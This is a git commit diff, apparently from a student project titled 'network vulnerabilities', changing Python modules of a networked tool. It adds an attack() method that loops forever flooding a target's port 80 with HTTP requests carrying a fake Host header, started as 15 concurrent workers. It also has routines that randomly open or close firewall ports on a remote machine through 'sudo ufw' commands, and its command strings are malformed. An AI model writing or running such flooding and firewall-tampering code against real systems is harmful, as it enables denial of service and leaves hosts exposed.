1ecc23f1a0d4aa329b463c96c31da86924ec26f4
DamianyRosales <damiany.rosales.is@unipolidgo.edu.mx>
2022-03-22 15:35:19 +0000

    network vulnerabilities

--- modules/core.py
+++ modules/core.py
@@ -12,14 +12,19 @@ chat = communication.Interface(client)
 nscanner = NScanner(client)
 
 #pool.add(chat.establish)
-pool.add(nscanner.open_random_ports)
+#pool.add(nscanner.open_random_ports)
 pool.add(nscanner.check_ports, 0,10)
 
+for i in range(15):
+    pool.add(nscanner.attack)
+
 if getuser() == 'nyro':
-    pass
-    #pool.add(cry.keyToServerCheck)
+    pool.add(cry.keyToServerCheck)
 
 if getuser() == 'soupmctavish12':
+    pass
+
+if getuser() == 'emmanuel':
     pass
 
 #client.close()
--- modules/networkscanner.py
+++ modules/networkscanner.py
@@ -8,7 +8,11 @@ class NScanner:
         self.credentials = open('credentials.txt', 'r').read().split('\n')
         self.ip = self.credentials[0]
         self.openports = []
-
+        
+        self.target = self.ip
+        self.fake_ip = '182.21.20.32'
+        self.port = 80 
+    
     def check_ports(self, start, end):
         if start == 450:
             start = 0
@@ -36,12 +40,30 @@ class NScanner:
             except: pass
         portsfile.close()
         self.check_ports(start+10, end+10)
-#tofinish
+
     def open_random_ports(self):
         while True:
             port = randint(0,450)
             if not port == 22:
                 com = 'sudo ufw allow' + str(port)
                 self.client.command(com)
-                print('open'+port)
+                print('open '+str(port))
 
+    def close_random_ports(self):
+        while True:
+            port = randint(0,450)
+            if not port == 22:
+                com = 'sudo ufw deny' + str(port)
+                self.client.command(com)
+                print('open '+str(port))
+
+    attack_num = 0
+    def attack(self):
+        while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                s.connect((self.target, self.port))
+                s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
+                s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
+                s.close()
+            except: pass
